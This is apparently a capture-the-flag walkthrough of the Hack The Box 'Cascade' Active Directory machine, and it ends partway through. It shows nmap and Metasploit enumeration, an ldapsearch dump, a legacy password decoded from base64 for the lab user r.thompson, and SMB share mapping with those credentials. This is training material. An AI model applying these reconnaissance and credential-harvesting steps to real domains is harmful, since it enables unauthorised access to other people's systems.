
![Image Cascade]()

## ---------->> Cascade <<------------

// We start with nmap scan

    $ nmap -sV -A -T4 -Pn 10.10.10.182 -p-
------

    Nmap scan report for 10.10.10.182
    Host is up (0.23s latency).
    Not shown: 65520 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    | dns-nsid: 
    |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-19 05:42:28Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc         Microsoft Windows RPC
    49170/tcp open  msrpc         Microsoft Windows RPC
    Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   2.1: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2021-09-19T05:43:30
    |_  start_date: 2021-09-19T05:36:14

// First we can see there is an ldap service running with Domain name 'cascade.local', lets add him to /etc/hosts

    $ cat /etc/hosts

    # Host addresses
    10.10.10.182 cascade.local

// Lets try to get more info about the domain with nmap ldap scripts

    $ nmap -n -sV -Pn --script "ldap* and not brute" 10.10.10.182
 
 // It didnt really help me, the output is huge and the only interesting line there is the DC name
 
     $cat nmap_ldapScripts.txt | grep @CASCADE
    |       ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL

// Moving on, Tring to enumerate domain users with MetaSploit and rockyou.txt could work for you

// but it didnt for me(stops after minute)

    msf6 auxiliary(gather/kerberos_enumusers) > options 

    Module options (auxiliary/gather/kerberos_enumusers):

       Name       Current Setting                  Required  Description
       ----       ---------------                  --------  -----------
       DOMAIN     cascade.local                    yes       The Domain Eg: demo.local
       RHOSTS     10.10.10.182                     yes       The target host(s), range CIDR identifier, or hosts fi
                                                             le with syntax 'file:<path>'
       RPORT      88                               yes       The target port
       Timeout    10                               yes       The TCP timeout to establish connection and read data
       USER_FILE  /home/r4r3/Desktop/htb/wordlist  yes       Files containing usernames, one per line
                  s--/rockyou.txt

    msf6 auxiliary(gather/kerberos_enumusers) > exploit 
    [*] Running module against 10.10.10.182

    [*] Validating options...
    [*] Using domain: CASCADE.LOCAL...
    [*] 10.10.10.182:88 - Testing User: "123456"...
    [*] 10.10.10.182:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database
    ...[SNIP]...
    [*] 10.10.10.182:88 - User: "mexico" does not exist
    [*] 10.10.10.182:88 - Testing User: "brianna"...
    [-] Auxiliary failed: Errno::ECONNRESET Connection reset by peer
    [-] Call stack:
    [-]   /usr/lib/ruby/2.7.0/socket.rb:452:in `__read_nonblock'
    [-]   /usr/lib/ruby/2.7.0/socket.rb:452:in `read_nonblock'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:91:in `block in read'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:351:in `synchronize_access'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:89:in `read'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:223:in `get_once'
    [-]   /usr/share/metasploit-framework/lib/rex/proto/kerberos/client.rb:163:in `recv_response_tcp'
    [-]   /usr/share/metasploit-framework/lib/rex/proto/kerberos/client.rb:102:in `recv_response'
    [-]   /usr/share/metasploit-framework/lib/rex/proto/kerberos/client.rb:120:in `send_recv'
    [-]   /usr/share/metasploit-framework/lib/msf/core/exploit/remote/kerberos/client.rb:112:in `send_request_as'
    [-]   /usr/share/metasploit-framework/modules/auxiliary/gather/kerberos_enumusers.rb:67:in `block in run'
    [-]   /usr/share/metasploit-framework/modules/auxiliary/gather/kerberos_enumusers.rb:65:in `each'
    [-]   /usr/share/metasploit-framework/modules/auxiliary/gather/kerberos_enumusers.rb:65:in `run'
    [*] Auxiliary module execution completed

// must be some missing library.... 

// So i tried other ways like [kerbrute](https://github.com/TarlogicSecurity/kerbrute) and [responder](https://tools.kali.org/sniffingspoofing/responder)

// And finally get the most valuable data with [ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)(helping [examples](https://access.redhat.com/documentation/en-us/red_hat_directory_server/10/html/administration_guide/examples-of-common-ldapsearches)) and [linux4enum](https://tools.kali.org/information-gathering/enum4linux).

    $ ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local" > ldapsearch_res.txt

// The output is HUGE , so after some digging in the file, i output the unique information(Users&groups and unique value)

    $ cat ldapsearch_res.txt | grep sAMAccountName
-----

    sAMAccountName: CascGuest
    sAMAccountName: Users
    sAMAccountName: Guests
    sAMAccountName: Remote Desktop Users
    sAMAccountName: Network Configuration Operators
    sAMAccountName: Performance Monitor Users
    sAMAccountName: Performance Log Users
    sAMAccountName: Distributed COM Users
    sAMAccountName: IIS_IUSRS
    sAMAccountName: Cryptographic Operators
    sAMAccountName: Event Log Readers
    sAMAccountName: Certificate Service DCOM Access
    sAMAccountName: CASC-DC1$
    sAMAccountName: Domain Computers
    sAMAccountName: Cert Publishers
    sAMAccountName: Domain Users
    sAMAccountName: Domain Guests
    sAMAccountName: Group Policy Creator Owners
    sAMAccountName: RAS and IAS Servers
    sAMAccountName: Pre-Windows 2000 Compatible Access
    sAMAccountName: Incoming Forest Trust Builders
    sAMAccountName: Windows Authorization Access Group
    sAMAccountName: Terminal Server License Servers
    sAMAccountName: Allowed RODC Password Replication Group
    sAMAccountName: Denied RODC Password Replication Group
    sAMAccountName: Enterprise Read-only Domain Controllers
    sAMAccountName: DnsAdmins
    sAMAccountName: DnsUpdateProxy
    sAMAccountName: arksvc
    sAMAccountName: s.smith
    sAMAccountName: r.thompson
    sAMAccountName: util
    sAMAccountName: IT
    sAMAccountName: Production
    sAMAccountName: HR
    sAMAccountName: j.wakefield
    sAMAccountName: AD Recycle Bin
    sAMAccountName: Backup
    sAMAccountName: s.hickson
    sAMAccountName: j.goodhand
    sAMAccountName: Temps
    sAMAccountName: a.turnbull
    sAMAccountName: WinRMRemoteWMIUsers__
    sAMAccountName: Remote Management Users
    sAMAccountName: e.crowe
    sAMAccountName: b.hanson
    sAMAccountName: d.burman
    sAMAccountName: BackupSvc
    sAMAccountName: Factory
    sAMAccountName: Finance
    sAMAccountName: j.allen
    sAMAccountName: i.croft
    sAMAccountName: Audit Share
    sAMAccountName: Data Share
-----

    $ cat ldapsearch_res.txt | grep cascadeLegacyPwd
    cascadeLegacyPwd: clk0bjVldmE=

// We have an encrypted string, lets decrypt it

    $echo 'clk0bjVldmE=' | base64 -d
    rY4n5eva
    
// It looks like user 'r.thompson' password    

    sAMAccountName: r.thompson
    sAMAccountType: 805306368
    userPrincipalName: r.thompson@cascade.local
    objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
    dSCorePropagationData: 20200126183918.0Z
    dSCorePropagationData: 20200119174753.0Z
    dSCorePropagationData: 20200119174719.0Z
    dSCorePropagationData: 20200119174508.0Z
    dSCorePropagationData: 16010101000000.0Z
    lastLogonTimestamp: 132294360317419816
    msDS-SupportedEncryptionTypes: 0
    cascadeLegacyPwd: clk0bjVldmE=
-----

    r.thompson : rY4n5eva

// Earlier when scaned with enum4linux there waz shares enumerating that showed me 

// that we not have permissions to shared files

    [+] Got OS info for 10.10.10.182 from smbclient: 
    [+] Got OS info for 10.10.10.182 from srvinfo:
    Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

// could also check by urself with smbclient

    $ smbclient -N -L \\10.10.10.182
-----

    Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
    SMB1 disabled -- no workgroup available

// Now that we have creds we can See if we have permissions for any shared files


    $smbmap -u r.thompson -p rY4n5eva -H cascade.local
-----

    [+] IP: cascade.local:445	Name: unknown                                           
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        ADMIN$                                            	NO ACCESS	Remote Admin
        Audit$                                            	NO ACCESS	
        C$                                                	NO ACCESS	Default share
        Data                                              	READ ONLY	
        IPC$                                              	NO ACCESS	Remote IPC
        NETLOGON                                          	READ ONLY	Logon server share 
        print$                                            	READ ONLY	Printer Drivers
        SYSVOL                                            	READ ONLY	Logon server share 

